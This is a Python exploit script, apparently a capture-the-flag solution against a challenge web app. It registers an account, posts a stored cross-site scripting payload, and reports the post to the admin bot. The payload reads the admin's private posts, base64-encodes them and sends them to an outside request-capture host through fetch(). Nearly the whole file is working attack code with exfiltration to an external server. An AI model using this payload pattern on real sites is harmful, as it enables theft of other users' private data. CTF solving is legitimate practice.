import requests

BASE_URL = "http://challs.tfcctf.com:31019"
PAYLOAD = """
<script>

const ATTACKER_SERVER="https://enkpfw7a69sir.x.pipedream.net"
fetch("https://enkpfw7a69sir.x.pipedream.net/here")
function exfil_info( text){
    fetch(ATTACKER_SERVER +"?flag="+ text, {method: 'GET', mode: 'no-cors'});
}
  var xhr  = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            exfil_info( btoa(xhr.responseText));
        }
    }
    xhr.open('GET', "/posts/view/admin", true);
    xhr.send(null);

</script>
"""
s = requests.Session()
creds = {"username": "uid", "password": "pw"}

resp = s.post(BASE_URL + "/api/register", json=creds)

print(resp.text)

assert resp.status_code == 200


resp = s.post(BASE_URL + "/api/login", json=creds)


resp = s.delete(BASE_URL + "/api/posts")
resp = s.post(
    BASE_URL + "/api/posts",
    json={"title": "exploit", "content": PAYLOAD, "hidden": False},
)

print(resp.text)

resp = s.post(
    BASE_URL + "/api/report?username=" + creds["username"],
    json={"username": creds["username"]},
)

print(resp.text)
